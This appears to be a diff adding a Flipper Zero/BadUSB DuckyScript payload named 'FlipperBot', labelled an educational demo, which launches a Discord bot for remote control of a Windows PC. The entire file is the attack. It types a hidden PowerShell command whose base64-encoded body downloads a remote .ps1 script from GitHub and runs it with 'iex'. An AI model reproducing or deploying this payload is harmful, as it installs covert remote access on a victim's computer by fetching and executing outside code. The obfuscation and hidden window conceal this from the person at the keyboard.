@@ -1,0 +1,14 @@
+
+REM Title: FlipperBot - Demo Educativa de Bot de Discord
+REM Author: demo
+REM Description: Lanza un bot de Discord que permite control remoto educativo de la PC.
+REM Target: Windows 10/11
+REM Keyboard: en-US (via Win+R Run Dialog)
+
+DEFAULT_DELAY 100
+
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -W H -EncodedCommand aQByAG0AIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGkAcgBvAG4AcAB4AHMALwBmAGwAaQBwAHAAZQByAF8AcwBjAHIAaQBwAHQAcwAvAG0AYQBpAG4ALwBmAGwAaQBwAHAAZQByAGIAbwB0AC8AZgA0ADQAYgAxADgANwA0AGQAOABjAGMAZQAxADIAYgBfAHIAdQBuAC4AcABzADEAIAB8ACAAaQBlAHgA
+ENTER
